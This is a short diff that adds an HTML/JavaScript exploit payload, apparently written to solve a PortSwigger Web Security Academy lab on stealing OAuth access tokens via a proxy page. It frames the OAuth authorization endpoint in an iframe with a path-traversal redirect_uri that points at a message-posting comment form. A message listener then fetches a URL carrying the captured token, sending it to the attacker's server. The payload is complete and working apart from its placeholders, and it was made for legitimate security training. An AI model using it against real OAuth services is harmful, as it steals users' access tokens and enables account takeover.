@@ -1,0 +1,9 @@
+<!--HTML/JavaScript payload to solve the following lab:-->
+<!--https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-->
+
+<iframe src="[INSERT OAUTH URL HERE]/auth?client_id=[INSERT CLIENT ID HERE]&redirect_uri=[INSERT LAB URL HERE]/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-166717081&scope=openid%20profile%20email"></iframe>
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
